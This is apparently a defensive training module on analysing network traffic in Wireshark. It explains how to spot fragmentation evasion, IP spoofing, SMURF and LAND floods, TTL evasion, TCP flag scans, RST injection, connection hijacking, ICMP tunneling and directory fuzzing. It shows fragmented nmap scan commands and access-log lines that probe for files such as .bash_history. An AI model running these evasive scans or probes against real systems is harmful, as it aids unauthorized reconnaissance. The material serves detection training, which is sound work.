+<p>When we begin to look for network anomalies, we should always consider the IP layer. Simply put, the IP layer functions in its ability to transfer packets from one hop to another. This layer uses source and destination IP addresses for inter-host communications. When we examine this traffic, we can identify the IP addresses as they exist within the IP header of the packet.</p>
+<p>However, it is essential to note that this layer has no mechanisms to identify when packets are lost, dropped, or otherwise tampered with. Instead, we need to recognize that these mishaps are handled by the transport or application layers for this data. To dissect these packets, we can explore some of their fields:</p>
+<ol>
+<li><code>Length - IP header length</code>: This field contains the overall length of the IP header.</li>
+<li><code>Total Length - IP Datagram/Packet Length</code>: This field specifies the entire length of the IP packet, including any relevant data.</li>
+<li><code>Fragment Offset</code>: In many cases when a packet is large enough to be divided, the fragmentation offset will be set to provide instructions to reassemble the packet upon delivery to the destination host.</li>
+<li><code>Source and Destination IP Addresses</code>: These fields contain the origination (source) and destination IP addresses for the two communicating hosts.</li>
+</ol>
+<p><img src="storage\modules\229\IPheader.jpg" alt="IP Header Placeholder Diagram"></p>
+<h3 id="commonly-abused-fields">Commonly Abused Fields</h3>
+<p>Innately, attackers might craft these packets to cause communication issues. Traditionally, an attacker might attempt to evade IDS controls through packet malformation or modification. As such, diving into each one of these fields and understanding how we can detect their misuse will equip us with the tools to succeed in our traffic analysis efforts.</p>
+<h3 id="abuse-of-fragmentation">Abuse of Fragmentation</h3>
+<p>Fragmentation serves as a means for our legitimate hosts to communicate large data sets to one another by splitting the packets and reassembling them upon delivery. This is commonly achieved through setting a maximum transmission unit (MTU). The MTU is used as the standard to divide these large packets into equal sizes to accommodate the entire transmission. It is worth noting that the last packet will likely be smaller. This field gives instructions to the destination host on how it can reassemble these packets in logical order.</p>
+<p>Commonly, attackers might abuse this field for the following purposes:</p>
+<ol>
+<li><code>IPS/IDS Evasion</code> - Let's say for instance that our intrusion detection controls do not reassemble fragemented packets. Well, for short, an attacker could split their nmap or other enumeration techniques to be fragmented, and as such it could bypass these controls and be reassembled at the destination.</li>
+<li><code>Firewall Evasion</code> - Through fragmentation, an attacker could likewise evade a firewall's controls through fragmentation. Once again, if the firewall does not reassemble these packets before delivery to the destination host, the attacker's enumeration attempt might succeed.</li>
+<li><code>Firewall/IPS/IDS Resource Exhaustion</code> - Suppose an attacker were to craft their attack to fragment packets to a very small MTU (10, 15, 20, and so on), the network control might not reassemble these packets due to resource constraints, and the attacker might succeed in their enumeration efforts.</li>
+<li><code>Denial of Service</code> - For old hosts, an attacker might utilize fragmentation to send IP packets exceeding 65535 bytes through ping or other commands. In doing so, the destination host will reassemble this malicious packet and experience countless different issues. As such, the resultant condition is successful denial-of-service from the attacker.</li>
+</ol>
+<p>If our network mechanism were to perform correctly. It should do the following:</p>
+<ul>
+<li><code>Delayed Reassembly</code> - The IDS/IPS/Firewall should act the same as the destination host, in the sense that it waits for all fragments to arrive to reconstruct the transmission to perform packet inspection.</li>
+</ul>
+<h3 id="finding-irregularities-in-fragment-offsets">Finding Irregularities in Fragment Offsets</h3>
+<p>In order to better understand the abovementioned mechanics, we can open the related traffic capture file in Wireshark.</p>
+<p>Fragmentation Attacks</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ wireshark nmap_frag_fw_bypass.pcapng
+</code></pre>
+<p>For starters, we might notice several ICMP requests going to one host from another, this is indicative of the starting requests from a traditional Nmap scan. This is the beginning of the host discovery process. An attacker might run a command like this.</p>
+<p><strong>Attacker's Enumeration</strong></p>
+<p>Fragmentation Attacks</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ nmap &lt;host ip&gt;
+</code></pre>
+<p>In doing so, they will generate the following.</p>
+<p><img src="storage\modules\229\1-frag.png" alt="Packet Fragmentation"></p>
+<p>Secondarily, an attacker might define a maximum transmission unit size like this in order to fragment their port scanning packets.</p>
+<p>Fragmentation Attacks</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ nmap -f <span class="hljs-number">10</span> &lt;host ip&gt;
+</code></pre>
+<p>In doing so they will generate IP packets with a maximum size of 10. Seeing a ton of fragmentation from a host can be an indicator of this attack, and it would look like the following.</p>
+<p><img src="storage\modules\229\2-frag.png" alt="Packet Fragmentation 2"></p>
+<p>However, the more notable indicator of a fragmentation scan, regardless of its evasion use is the single host to many ports issues that it generates. Let's take the following for instance.</p>
+<p><img src="storage\modules\229\3-frag.png" alt="Packet Fragmentation 3"></p>
+<p>In this case, the destination host would respond with RST flags for ports which do not have an active service running on them (aka closed ports). This pattern is a clear indication of a fragmented scan.</p>
+<p>If our Wireshark is not reassembling packets for our inspection, we can make a quick change in our preferences for the IPv4 protocol.</p>
+<p><img src="storage\modules\229\4-frag.png" alt="Packet Fragmentation"></p>
+<h2 id="ip-source-destination-spoofing-attacks">IP Source &amp; Destination Spoofing Attacks</h2>
+<hr>
+<p>There are many cases where we might see irregular traffic for IPv4 and IPv6 packets. In many such cases, this might be done through the source and destination IP fields. We should always consider the following when analyzing these fields for our traffic analysis efforts.</p>
+<ol>
+<li><code>The Source IP Address should always be from our subnet</code> - If we notice that an incoming packet has an IP source from outside of our local area network, this can be an indicator of packet crafting.</li>
+<li><code>The Source IP for outgoing traffic should always be from our subnet</code> - If the source IP is from a different IP range than our own local area network, this can be an indicator of malicious traffic that is originating from inside our network.</li>
+</ol>
+<p>An attacker might conduct these packet crafting attacks towards the source and destination IP addresses for many different reasons or desired outcomes. Here are a few that we can look for:</p>
+<ol>
+<li><code>Decoy Scanning</code> - In an attempt to bypass firewall restrictions, an attacker might change the source IP of packets to enumerate further information about a host in another network segment. Through changing the source to something within the same subnet as the target host, the attacker might succeed in firewall evasion.</li>
+<li><code>Random Source Attack DDoS</code> - Through random source crafting an attacker might be able to send tons of traffic to the same port on the victim host. This in many cases, is used to exhaust resources of our network controls or on the destination host.</li>
+<li><code>LAND Attacks</code> - LAND Attacks operate similarly to Random Source denial-of-service attacks in the nature that the source address is set to the same as the destination hosts. In doing so the attacker might be able to exhaust network resources or cause crashes on the target host.</li>
+<li><code>SMURF Attacks</code> - Similar to LAND and Random Source attacks, SMURF attacks work through the attacker sending large amounts of ICMP packets to many different hosts. However, in this case the source address is set to the victim machines, and all of the hosts which receive this ICMP packet respond with an ICMP reply causing resource exhaustion on the crafted source address (victim).</li>
+<li><code>Initialization Vector Generation</code> - In older wireless networks such as wired equivalent privacy, an attacker might capture, decrypt, craft, and re-inject a packet with a modified source and destination IP address in order to generate initialization vectors to build a decryption table for a statistical attack. These can be seen in nature by noticing an excessive amount of repeated packets between hosts.</li>
+</ol>
+<p>It is important to note, that unlike ARP poisoning, the attacks we will be exploring in this section derive from IP layer communications and not ARP poisoning necessarily. However, these attacks tend to be conducted in tandem for most nefarious activities.</p>
+<hr>
+<h3 id="finding-decoy-scanning-attempts">Finding Decoy Scanning Attempts</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>decoy_scanning_nmap.pcapng</code></li>
+</ul>
+<p>Simply put, when an attacker wants to gather information, they might change their source address to be the same as another legitimate host, or in some cases entirely different from any real host. This is to attempt to evade IDS/Firewall controls, and it can be easily observed.</p>
+<p>In the case of decoy scanning, we will notice some strange behavior.</p>
+<ol>
+<li><code>Initial Fragmentation from a fake address</code></li>
+<li><code>Some TCP traffic from the legitimate source address</code></li>
+</ol>
+<p><img src="storage\modules\229\1-decoy.png" alt="Decoy Scanning 1"></p>
+<p>Secondarily, in this attack the attacker might be attempting to cloak their address with a decoy, but the responses for multiple closed ports will still be directed towards them with the RST flags denoted for TCP.</p>
+<p><img src="storage\modules\229\2-decoy.png" alt="Decoy Scanning 2"></p>
+<p>We will definitely notice this in the case of a large port block which has no services running on the victim host.</p>
+<p><img src="storage\modules\229\3-decoy.png" alt="Decoy Scanning 3"></p>
+<p>As such, another simple way that we can prevent this attack beyond just detecting it through our traffic analysis efforts is the following.</p>
+<ol>
+<li><code>Have our IDS/IPS/Firewall act as the destination host would</code> - In the sense that reconstructing the packets gives a clear indication of malicious activity.</li>
+<li><code>Watch for connections started by one host, and taken over by another</code> - The attacker after all has to reveal their true source address in order to see that a port is open. This is strange behavior and we can define our rules to prevent it.</li>
+</ol>
+<h3 id="finding-random-source-attacks">Finding Random Source Attacks</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>ICMP_rand_source.pcapng</code></li>
+<li><code>ICMP_rand_source_larg_data.pcapng</code></li>
+<li><code>TCP_rand_source_attacks.pcapng</code></li>
+</ul>
+<p>On the opposite side of things, we can begin to explore denial-of-service attacks through source and destination address spoofing. One of the primary and notable examples is random source attacks. These can be conducted in many different flavors. However, notably this can be done like the opposite of a SMURF attack, in which many hosts will ping one host which does not exist, and the pinged host will ping back all others and get no reply.</p>
+<p><img src="storage\modules\229\1-random-source.png" alt="Random Source Attacks 1"></p>
+<p>We should also consider that attackers might fragment these random hosts communications in order to draw out more resource exhaustion.</p>
+<p><img src="storage\modules\229\2-random-source.png" alt="Random Source Attacks 2"></p>
+<p>However in many cases, like LAND attacks, these attacks will be used by attackers to exhaust resources to one specific service on a port. Instead of spoofing the source address to be the same as the destination, the attacker might randomize them. We might notice the following.</p>
+<p><img src="storage\modules\229\3-random-source.png" alt="Random Source Attacks 3"></p>
+<p>In this case, we have a few indicators of nefarious behavior:</p>
+<ol>
+<li><code>Single Port Utilization from random hosts</code></li>
+<li><code>Incremental Base Port with a lack of randomization</code></li>
+<li><code>Identical Length Fields</code></li>
+</ol>
+<p>In many real world cases, like a web server, we may have many different users utilizing the same port. However, these requests are contrary of our indicators. Such that they will have different lengths and the base ports will not exhibit this behavior.</p>
+<h3 id="finding-smurf-attacks">Finding Smurf Attacks</h3>
+<p>SMURF Attacks are a notable distributed denial-of-service attack, in the nature that they operate through causing random hosts to ping the victim host back. Simply put, an attacker conducts these like the following:</p>
+<ol>
+<li><code>The attacker will send an ICMP request to live hosts with a spoofed address of the victim host</code></li>
+<li><code>The live hosts will respond to the legitimate victim host with an ICMP reply</code></li>
+<li><code>This may cause resource exhaustion on the victim host</code></li>
+</ol>
+<p>One of the things we can look for in our traffic behavior is an excessive amount of ICMP replies from a single host to our affected host. Sometimes attackers will include fragmentation and data on these ICMP requests to make the traffic volume larger.</p>
+<p><img src="storage\modules\229\1-SMURF.png" alt="SMURF"></p>
+<p>We might notice many different hosts pinging our single host, and in this case it represents the basic nature of SMURF attacks.</p>
+<p><img src="storage\modules\229\smurf.png" alt="SMURF Attacks 2"></p>
+<p><strong>Image From</strong>: <a href="https://techofide.com/blogs/what-is-smurf-attack-what-is-the-denial-of-service-attack-practical-ddos-attack-step-by-step-guide/">https://techofide.com/blogs/what-is-smurf-attack-what-is-the-denial-of-service-attack-practical-ddos-attack-step-by-step-guide/</a></p>
+<h3 id="finding-land-attacks">Finding LAND Attacks</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>LAND-DoS.pcapng</code></li>
+</ul>
+<p>LAND attacks operate through an attacker spoofing the source IP address to be the same as the destination. These denial-of-service attacks work through sheer volume of traffic and port re-use. Essentially, if all base ports are occupied, it makes real connections much more difficult to establish to our affected host.</p>
+<p><img src="storage\modules\229\1-LAND.png" alt="LAND Attacks"></p>
+<h2 id="ip-time-to-live-attacks">IP Time-to-Live Attacks</h2>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>ip_ttl.pcapng</code></li>
+</ul>
+<hr>
+<p>Time-to-Live attacks are primarily utilized as a means of evasion by attackers. Basically speaking the attacker will intentionally set a very low TTL on their IP packets in order to attempt to evade firewalls, IDS, and IPS systems. These work like the following.</p>
+<p><img src="storage\modules\229\ttl-attack-diagram.png" alt="TTL Manipulation"></p>
+<ol>
+<li>The attacker will craft an IP packet with an intentionally low TTL value (1, 2, 3 and so on).</li>
+<li>Through each host that this packet passes through this TTL value will be decremented by one until it reaches zero.</li>
+<li>Upon reaching zero this packet will be discarded. The attacker will try to get this packet discarded before it reaches a firewall or filtering system to avoid detection/controls.</li>
+<li>When the packets expire, the routers along the path generate ICMP Time Exceeded messages and send them back to the source IP address.</li>
+</ol>
+<p><strong>Finding Irregularities in IP TTL</strong></p>
+<p>For starters, we can begin to dump our traffic and open it in Wireshark. Detecting this in small amounts can be difficult, but fortunately for us attackers will most times utilize ttl manipulation in port scanning efforts. Right away we might notice something like the following.</p>
+<p><img src="storage\modules\229\1-ttl.png" alt="IP TTL 1"></p>
+<p>However, we might also notice a returned SYN, ACK message from one of our legitimate service ports on our affected host. In doing so, the attacker might have successfully evaded one of our firewall controls.</p>
+<p><img src="storage\modules\229\2-ttl.png" alt="IP TTL 2"></p>
+<p>So, if we were to open one of these packets, we could realistically see why this is. Suppose we opened the IPv4 tab in Wireshark for any of these packets. We might notice a very low TTL like the following.</p>
+<p><img src="storage\modules\229\3-ttl.png" alt="IP TTL 3"></p>
+<p>As such, we can implement a control which discards or filters packets that do not have a high enough TTL. In doing so, we can prevent these forms of IP packet crafting attacks.</p>
+<h2 id="tcp-handshake-abnormalities">TCP Handshake Abnormalities</h2>
+<hr>
+<p>Innately, when attackers are gaining information on our TCP services, we might notice a few odd behaviors during our traffic analysis efforts. Firstly, let's consider how normal TCP connections work with their 3-way handshake.</p>
+<p><img src="storage\modules\229\tcp_handshake_1.jpg" alt="TCP Handshake"></p>
+<p>To initiate a TCP connection for whatever purpose the client first sends the machine it is attempting to connect to a TCP SYN request to begin the TCP connection.</p>
+<p>If this port is open, and in fact able to be connected to, the machine responds with a TCP SYN/ACK to acknowledge that the connection is valid and able to be used. However, we should consider all TCP flags.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Flags</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>URG (Urgent)</code></td>
+<td>This flag is to denote urgency with the current data in stream.</td>
+</tr>
+<tr>
+<td><code>ACK (Acknowledgement)</code></td>
+<td>This flag acknowledges receipt of data.</td>
+</tr>
+<tr>
+<td><code>PSH (Push)</code></td>
+<td>This flag instructs the TCP stack to immediately deliver the received data to the application layer, and bypass buffering.</td>
+</tr>
+<tr>
+<td><code>RST (Reset)</code></td>
+<td>This flag is used for termination of the TCP connection (we will dive into hijacking and RST attacks soon).</td>
+</tr>
+<tr>
+<td><code>SYN (Synchronize)</code></td>
+<td>This flag is used to establish an initial connection with TCP.</td>
+</tr>
+<tr>
+<td><code>FIN (Finish)</code></td>
+<td>This flag is used to denote the finish of a TCP connection. It is used when no more data needs to be sent.</td>
+</tr>
+<tr>
+<td><code>ECN (Explicit Congestion Notification)</code></td>
+<td>This flag is used to denote congestion within our network, it is to let the hosts know to avoid unnecessary re-transmissions.</td>
+</tr>
+</tbody>
+</table>
+<p>As such, when we are performing our traffic analysis efforts we can look for the following strange conditions:</p>
+<ol>
+<li><code>Too many flags of a kind or kinds</code> - This could show us that scanning is occuring within our network.</li>
+<li><code>The usage of different and unusual flags</code> - Sometimes this could indicate a TCP RST attack, hijacking, or simply some form of control evasion for scanning.</li>
+<li><code>Solo host to multiple ports, or solo host to multiple hosts</code> - Easy enough, we can find scanning as we have done before by noticing where these connections are going from one host. In a lot of cases, we may even need to consider decoy scans and random source attacks.</li>
+</ol>
+<h3 id="excessive-syn-flags">Excessive SYN Flags</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>nmap_syn_scan.pcapng</code></li>
+</ul>
+<p>Right away one of the traffic patterns that we can notice is too many SYN flags. This is a prime example of nmap scanning. Simply put, the adversary will send TCP SYN packets to the target ports. In the case where our port is open, our machine will respond with a SYN-ACK packet to continue the handshake, which will then be met by an RST from the attackers scanner. However, we can get lost in the RSTs here as our machine will respond with RST for closed ports.</p>
+<p><img src="storage\modules\229\1-TCPhandshake.png" alt="SYN Scanning"></p>
+<p>However it is worth noting that there are two primary scan types we might detect that use the SYN flag. These are:</p>
+<ol>
+<li><code>SYN Scans</code> - In these scans the behavior will be as we see, however the attacker will pre-emptively end the handshake with the RST flag.</li>
+<li><code>SYN Stealth Scans</code> - In this case the attacker will attempt to evade detection by only partially completing the TCP handshake.</li>
+</ol>
+<h3 id="no-flags">No Flags</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>nmap_null_scan.pcapng</code></li>
+</ul>
+<p>On the opposite side of things, the attacker might send no flags. This is what is commonly referrred to as a NULL scan. In a NULL scan an attacker sends TCP packets with no flags. TCP connections behave like the following when a NULL packet is received.</p>
+<ol>
+<li><code>If the port is open</code> - The system will not respond at all since there is no flags.</li>
+<li><code>If the port is closed</code> - The system will respond with an RST packet.</li>
+</ol>
+<p>As such a NULL scan might look like the following.</p>
+<p><img src="storage\modules\229\2-TCPhandshake.png" alt="Null Scanning"></p>
+<h3 id="too-many-acks">Too Many ACKs</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>nmap_ack_scan.pcapng</code></li>
+</ul>
+<p>On the other hand, we might notice an excessive amount of acknowledgements between two hosts. In this case the attacker might be employing the usage of an ACK scan. In the case of an ACK scan TCP connections will behave like the following.</p>
+<ol>
+<li><code>If the port is open</code> - The affected machine will either not respond, or will respond with an RST packet.</li>
+<li><code>If the port is closed</code> - The affected machine will respond with an RST packet.</li>
+</ol>
+<p>So, we might see the following traffic which would indicate an ACK scan.</p>
+<p><img src="storage\modules\229\3-TCPhandshake.png" alt="ACK Scanning"></p>
+<h3 id="excessive-fins">Excessive FINs</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>nmap_fin_scan.pcapng</code></li>
+</ul>
+<p>Using another part of the handshake, an attacker might utilize a FIN scan. In this case, all TCP packets will be marked with the FIN flag. We might notice the following behavior from our affected machine.</p>
+<ol>
+<li><code>If the port is open</code> - Our affected machine simply will not respond.</li>
+<li><code>If the port is closed</code> - Our affected machine will respond with an RST packet.</li>
+</ol>
+<p><img src="storage\modules\229\4-TCPhandshake.png" alt="FIN Scanning"></p>
+<h3 id="just-too-many-flags">Just too many flags</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>nmap_xmas_scan.pcapng</code></li>
+</ul>
+<p>Let's say the attacker just wanted to throw spaghetti at the wall. In that case, they might utilize a Xmas tree scan, which is when they put all TCP flags on their transmissions. Similarly, our affected host might respond like the following when all flags are set.</p>
+<ol>
+<li><code>If the port is open</code> - The affected machine will not respond, or at least it will with an RST packet.</li>
+<li><code>If the port is closed</code> - The affected machine will respond with an RST packet.</li>
+</ol>
+<p>Xmas tree scans are pretty easy to spot and look like the following.</p>
+<p><img src="storage\modules\229\5-TCPhandshake.png" alt="Xmas Tree Scanning"></p>
+<h2 id="tcp-connection-resets-hijacking">TCP Connection Resets &amp; Hijacking</h2>
+<hr>
+<p>Unfortunately, TCP does not provide the level of protection to prevent our hosts from having their connections terminated or hijacked by an attacker. As such, we might notice that a connection gets terminated by an RST packet, or hijacked through connection hijacking.</p>
+<h3 id="tcp-connection-termination">TCP Connection Termination</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>RST_Attack.pcapng</code></li>
+</ul>
+<p>Suppose an adversary wanted to cause denial-of-service conditions within our network. They might employ a simple TCP RST Packet injection attack, or TCP connection termination in simple terms.</p>
+<p>This attack is a combination of a few conditions:</p>
+<ol>
+<li><code>The attacker will spoof the source address to be the affected machine's</code></li>
+<li><code>The attacker will modify the TCP packet to contain the RST flag to terminate the connection</code></li>
+<li><code>The attacker will specify the destination port to be the same as one currently in use by one of our machines.</code></li>
+</ol>
+<p>As such, we might notice an excessive amount of packets going to one port.</p>
+<p><img src="storage\modules\229\1-RST.png" alt="TCP RST Attacks"></p>
+<p>One way we can verify that this is indeed a TCP RST attack is through the physical address of the transmitter of these TCP RST packets. Suppose, the IP address 192.168.10.4 is registered to aa:aa:aa:aa:aa:aa in our network device list, and we notice an entirely different MAC sending these like the following.</p>
+<p><img src="storage\modules\229\2-RST.png" alt="TCP RST Attacks"></p>
+<p>This would indicate malicious activity within our network, and we could conclude that this is likely a TCP RST Attack. However, it is worth noting that an attacker might spoof their MAC address in order to further evade detection. In this case, we could notice retransmissions and other issues as we saw in the ARP poisoning section.</p>
+<hr>
+<h3 id="tcp-connection-hijacking">TCP Connection Hijacking</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>TCP-hijacking.pcap</code></li>
+</ul>
+<p>For more advanced actors, they might employ TCP connection hijacking. In this case the attacker will actively monitor the target connection they want to hijack.</p>
+<p>The attacker will then conduct sequence number prediction in order to inject their malicious packets in the correct order. During this injection they will spoof the source address to be the same as our affected machine.</p>
+<p>The attacker will need to block ACKs from reaching the affected machine in order to continue the hijacking. They do this either through delaying or blocking the ACK packets. As such, this attack is very commonly employed with ARP poisoning, and we might notice the following in our traffic analysis.</p>
+<figure><img src=".gitbook\assets\image%20(358).png" alt=""><figcaption></figcaption></figure>
+
+<h2 id="icmp-tunneling">ICMP Tunneling</h2>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>icmp_tunneling.pcapng</code></li>
+</ul>
+<hr>
+<p>Tunneling is a technique employed by adversaries in order to exfiltrate data from one location to another. There are many different kinds of tunneling, and each different kind uses a different protocol. Commonly, attackers may utilize proxies to bypass our network controls, or protocols that our systems and controls allow.</p>
+<h3 id="basics-of-tunneling">Basics of Tunneling</h3>
+<p>Essentially, when an attacker wants to communicate data to another host, they may employ tunneling. In many cases, we might notice this through the attacker posessing some command and control over one of our machines. As noted, tunneling can be conducted in many different ways. One of the more common types is SSH tunneling. However, proxy-based, HTTP, HTTPs, DNS, and other types can be observed in similar ways.</p>
+<p><img src="storage\modules\229\basic-tunnel-1.png" alt="BASIC TUNNELING DIAGRAM"></p>
+<p>The idea behind tunneling is that an attacker will be able to expand their command and control and bypass our network controls through the protocol of their choosing.</p>
+<h3 id="icmp-tunneling">ICMP Tunneling</h3>
+<p>In the case of ICMP tunneling an attacker will append data they want to exfiltrate to the outside world or another host in the data field in an ICMP request. This is done with the intention to hide this data among a common protocol type like ICMP, and hopefully get lost within our network traffic.</p>
+<p><img src="storage\modules\229\icmp_ping_example.jpg" alt=""></p>
+<h3 id="finding-icmp-tunneling">Finding ICMP Tunneling</h3>
+<p>Since ICMP tunneling is primarily done through an attacker adding data into the data field for ICMP, we can find it by looking at the contents of data per request and reply.</p>
+<p><img src="storage\modules\229\1-ICMP-tunneling.png" alt="ICMP Tunnel 1"></p>
+<p>We can filter our wireshark capture to only ICMP requests and replies by entering ICMP into the filter bar.</p>
+<p><img src="storage\modules\229\2-ICMP-tunneling.png" alt="ICMP Tunnel 2"></p>
+<p>Suppose we noticed fragmentation occuring within our ICMP traffic as it is above, this would indicate a large amount of data being transferred via ICMP. In order to understand this behavior, we should look at a normal ICMP request. We may note that the data is something reasonable like 48 bytes.</p>
+<p><img src="storage\modules\229\3-ICMP-tunneling.png" alt="ICMP Tunnel 3"></p>
+<p>However a suspicious ICMP request might have a large data length like 38000 bytes.</p>
+<p><img src="storage\modules\229\4-ICMP-tunneling.png" alt="ICMP Tunnel 4"></p>
+<p>If we would like to take a look at the data in transit, we can look on the right side of our screen in Wireshark. In this case, we might notice something like a Username and Password being pinged to an external or internal host. This is a direct indication of ICMP tunneling.</p>
+<p><img src="storage\modules\229\5-ICMP-tunneling.png" alt="ICMP Tunnel 5"></p>
+<p>On the other hand, more advanced adversaries will utilize encoding or encryption when transmitting exfiltrated data, even in the case of ICMP tunneling. Suppose we noticed the following.</p>
+<p><img src="storage\modules\229\6-ICMP-tunneling.png" alt="ICMP Tunnel 6"></p>
+<p>We could copy this value out of Wireshark and decode it within linux with the base64 utility.</p>
+<p>ICMP Tunneling</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo='</span> | base64 <span class="hljs-_">-d</span>
+</code></pre>
+<p>This would also be a case where ICMP tunneling is observed. In many cases, if the ICMP data length is larger than 48-bytes, we know something fishy is going on, and should always look into it.</p>
+<h3 id="preventing-icmp-tunneling">Preventing ICMP Tunneling</h3>
+<p>In order to prevent ICMP tunneling from occuring we can conduct the following actions.</p>
+<ol>
+<li><code>Block ICMP Requests</code> - Simply, if ICMP is not allowed, attackers will not be able to utilize it.</li>
+<li><code>Inspect ICMP Requests and Replies for Data</code> - Stripping data, or inspecting data for malicious content on these requests and replies can allow us better insight into our environment, and the ability to prevent this data exfiltration.</li>
+</ol>
+<h2 id="http-https-service-enumeration">HTTP/HTTPs Service Enumeration</h2>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>basic_fuzzing.pcapng</code></li>
+</ul>
+<hr>
+<p>Many times, we might notice strange traffic to our web servers. In one of these cases, we might see that one host is generating excessive traffic with HTTP or HTTPs. Attackers like to abuse the transport layer many times, as the applications running on our servers might be vulnerable to different attacks. As such, we need to understand how to recognize the steps an attacker will take to gather information, exploit, and abuse our web servers.</p>
+<p>Generally speaking, we can detect and identify fuzzing attempts through the following</p>
+<ol>
+<li><code>Excessive HTTP/HTTPs traffic from one host</code></li>
+<li><code>Referencing our web server's access logs for the same behavior</code></li>
+</ol>
+<p>Primarily, attackers will attempt to fuzz our server to gather information before attempting to launch an attack. We might already have a <code>Web Application Firewall</code> in place to prevent this, however, in some cases we might not, especially if this server is internal.</p>
+<h3 id="finding-directory-fuzzing">Finding Directory Fuzzing</h3>
+<p>Directory fuzzing is used by attackers to find all possible web pages and locations in our web applications. We can find this during our traffic analysis by limiting our Wireshark view to only http traffic.</p>
+<ul>
+<li><code>http</code></li>
+</ul>
+<p><img src="storage\modules\229\2-HTTP-Enum.png" alt="HTTP Enumeration Detected"></p>
+<p>Secondarily, if we wanted to remove the responses from our server, we could simply specify <code>http.request</code></p>
+<p><img src="storage\modules\229\3-HTTP-Enum.png" alt="HTTP Enumeration Detected"></p>
+<p>Directory fuzzing is quite simple to detect, as it will in most cases show the following signs</p>
+<ol>
+<li><code>A host will repeatedly attempt to access files on our web server which do not exist (response 404)</code>.</li>
+<li><code>A host will send these in rapid succession</code>.</li>
+</ol>
+<p>We can also always reference this traffic within our access logs on our web server. For Apache this would look like the following two examples. To use grep, we could filter like so:</p>
+<p>HTTP/HTTPs Service Enumeration</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ cat access.log | grep <span class="hljs-string">"192.168.10.5"</span>
+
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /randomfile1 HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /frand2 HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.bash_history HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.bashrc HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.cache HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.config HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.cvs HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.cvsignore HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
